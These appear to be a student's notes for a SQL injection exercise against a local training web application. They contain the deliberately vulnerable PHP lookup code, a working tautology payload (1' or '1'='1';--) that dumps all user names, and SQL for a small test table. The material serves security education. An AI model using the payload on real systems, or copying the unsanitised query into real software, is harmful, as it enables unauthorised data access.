Task 5: SQL Injection
Link: http://192.168.56.102/vulnerabilities/sqli/

Description: Exploit the SQLi vulnerability present in the page and print the Firstname and Surname of all the users in the user table
Deliverables (report)

    Payload
    A short note about the SQLi vulnerability
    Screenshot of output


<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?> 

$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";

SELECT first_name, last_name FROM users WHERE user_id = '1' or 1=1;


1' or '1'='1';--


create table users
( id char(1), first_name char(10), last_name char(10) )


insert into users(id,first_name,last_name) values ('1','1FN','1LN')
insert into users(id,first_name,last_name) values ('2','2FN','2LN')
insert into users(id,first_name,last_name) values ('3','3FN','3LN')
insert into users(id,first_name,last_name) values ('4','4FN','4LN')
insert into users(id,first_name,last_name) values ('5','5FN','5LN')